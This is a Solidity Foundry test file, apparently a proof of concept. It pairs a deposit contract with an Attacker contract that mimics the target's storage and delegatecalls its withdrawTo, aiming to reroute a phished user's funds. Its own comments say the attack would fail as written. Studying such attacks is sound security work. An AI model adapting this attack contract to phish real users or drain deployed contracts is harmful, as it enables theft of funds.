pragma solidity 0.8.19;

import "forge-std/Test.sol";

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract IntegrationDepositor is Ownable {
    mapping(address => uint256) public balances;
    mapping(bytes4 => bool) public functionProtectionStatus;
    address public tokenAddress;

    event BalanceIncreased(address account, uint256 amt);
    event Withdrawal(address from, address to, uint256 amt);
    event log_protection_status(bytes4 sig, bool status);
    event log_msg_sender(address sender);

    constructor(address _tokenAddress) {
        tokenAddress = _tokenAddress;
    }

    modifier protected() {
        emit log_protection_status(msg.sig, functionProtectionStatus[msg.sig]);
        emit log_msg_sender(msg.sender);
        if (functionProtectionStatus[msg.sig]) {
            _;
        } else {
            revert("funds not safu");
        }
    }

    function updateProtectionStatus(bool status) public onlyOwner {
        functionProtectionStatus[0x205c2878] = status; // withdrawTo
    }

    function fundAccount(uint256 amt) public {
        require(Token(tokenAddress).balanceOf(msg.sender) >= amt, "Insufficient funds");
        balances[msg.sender] += amt;
        Token(tokenAddress).transferFrom(msg.sender, address(this), amt);
        emit BalanceIncreased(msg.sender, amt);
    }

    function withdrawTo(address dest, uint256 amt) public protected {
        require(balances[msg.sender] >= amt, "Insufficient funds");
        balances[msg.sender] -= amt;

        // when phished, this will fail as msg.sender in the token contract will be that of
        // the attacker, instead of this contract whose balance should be update
        Token(tokenAddress).transfer(dest, amt);

        // this would fail because "address(this)" would be the attacker in the case of a delegatecall
        // Token(tokenAddress).safeTransferFrom(address(this), dest, amit);

        emit Withdrawal(msg.sender, dest, amt);
    }
}

contract Attacker {
    address public owner; // slot 0 of the target
    mapping(address => uint256) public balances;
    mapping(bytes4 => bool) public functionProtectionStatus;
    address public tokenAddress;

    address public target;
    address public attacker;

    event BalanceIncreased(address account, uint256 amt);
    event Withdrawal(address from, address to, uint256 amt);
    event AttackSuccess();

    constructor(address _tokenAddress, address _target) {
        tokenAddress = _tokenAddress;
        target = _target;
        attacker = msg.sender;
    }

    // this is the function the attacker will phish the user into calling
    // this attack requires the attacker to trick the user into setting an approval
    function withdrawTo(address dest, uint256 amt) public {
        (dest); // we discard the destination address in favor of the attacker's address to reroute funds

        // spoof the function protection status for the function being enabled
        functionProtectionStatus[0x205c2878] = true; // {integration-withdrawTo}

        // storage will be read in this contract's context, so need to make sure balance is sufficient
        balances[msg.sender] = amt;
        (bool success,) = target.delegatecall(abi.encodeWithSignature("withdrawTo(address,uint256)", attacker, amt));
        require(success, "delegatecall failed");
        emit AttackSuccess();
    }
}

contract Token is ERC20, Ownable {
    event log_msg_sender(address sender);

    event RewardsAdded(address account, uint256 amt);

    mapping(address => uint256) public rewards;

    constructor() ERC20("CubeToken", "CBT") {}

    function airdrop(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }

    function checkSender() public {
        emit log_msg_sender(msg.sender);
    }
}

contract PhishingPOCTest is Test {
    Token internal token;
    IntegrationDepositor internal integration;
    Attacker internal phishingContract;

    address internal integrationDeployer;
    address internal user;
    address internal userTwo;
    address internal attackerDeployer;

    event BalanceIncreased(address account, uint256 amt);
    event Withdrawal(address from, address to, uint256 amt);

    function setUp() public {
        integrationDeployer = makeAddr("integrationDeployer");
        user = makeAddr("user");
        userTwo = makeAddr("userTwo");
        attackerDeployer = makeAddr("attackerDeployer");

        vm.startPrank(integrationDeployer);
        token = new Token();
        integration = new IntegrationDepositor(address(token));
        token.airdrop(user, 1 ether);
        vm.stopPrank();
        assertEq(token.balanceOf(user), 1 ether, "incorrect balance");

        vm.startPrank(attackerDeployer);
        phishingContract = new Attacker(address(token), address(integration));
        vm.stopPrank();
    }

    function testFundingAccountAndWithdrawal() public {
        vm.startPrank(user);
        token.approve(address(integration), type(uint256).max);
        vm.expectEmit(true, true, false, true);
        emit BalanceIncreased(user, 1 ether);
        integration.fundAccount(1 ether);
        assertEq(integration.balances(user), 1 ether, "incorrect balance");

        vm.expectRevert(bytes("funds not safu"));
        integration.withdrawTo(userTwo, 1 ether);
        vm.stopPrank();

        vm.prank(integrationDeployer);
        integration.updateProtectionStatus(true);

        vm.startPrank(user);
        vm.expectEmit(true, true, true, true);
        emit Withdrawal(user, userTwo, 1 ether);
        integration.withdrawTo(userTwo, 1 ether);
        assertEq(integration.balances(user), 0, "incorrect balance");
        assertEq(token.balanceOf(userTwo), 1 ether, "incorrect balance");
        vm.stopPrank();
    }

    function testPhishingWithdrawal() public {
        // the user deposits funds into the integration
        vm.startPrank(user);
        token.approve(address(integration), type(uint256).max);
        vm.expectEmit(true, true, false, true);
        emit BalanceIncreased(user, 1 ether);
        integration.fundAccount(1 ether);
        assertEq(integration.balances(user), 1 ether, "incorrect balance");
        vm.stopPrank();

        // user cannot withdraw funds because protection is not active
        vm.startPrank(user);
        vm.expectRevert(bytes("funds not safu"));
        integration.withdrawTo(userTwo, 1 ether);
        vm.stopPrank();

        // the integration deployer activates protection, thus enabling withdrawals
        vm.prank(integrationDeployer);
        integration.updateProtectionStatus(true);

        token.balanceOf(address(integration));

        // the attacker phises the user into calling the attacker contract
        vm.startPrank(user, user);
        phishingContract.withdrawTo(userTwo, 1 ether);
        vm.stopPrank();
    }
}
